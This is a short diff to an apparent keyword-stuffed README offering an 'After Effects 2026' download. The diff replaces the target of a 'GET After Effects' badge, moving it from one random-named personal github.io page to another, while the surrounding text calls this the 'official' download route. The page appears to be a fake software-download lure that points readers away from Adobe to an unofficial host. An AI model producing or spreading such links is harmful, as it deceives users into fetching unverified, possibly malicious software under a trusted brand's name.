@@ -54,7 +54,7 @@ Version-based searches such as after effects 2026, after effects 2025, after eff
 
 Prerequisites: A supported desktop system, an Adobe account, enough storage for cache files, and media assets ready for import.
 
-[![GET After Effects](https://img.shields.io/badge/GET%20%E2%80%94%20After%20Effects-0078D6?style=for-the-badge&logoColor=white)](https://kianrobleseber.github.io/.github/after-effects-2026)
+[![GET After Effects](https://img.shields.io/badge/GET%20%E2%80%94%20After%20Effects-0078D6?style=for-the-badge&logoColor=white)](https://nathanklineqiks.github.io/.github/after-effects-2026)
 
 1.  **Download and Install:** Use the official after effects download route, confirm your Adobe account, and install the correct version for your operating system.
 2.  **Create a Composition:** Open After Effects, start a new composition, set resolution and frame rate, then import footage, logos, audio, or an after effects template.
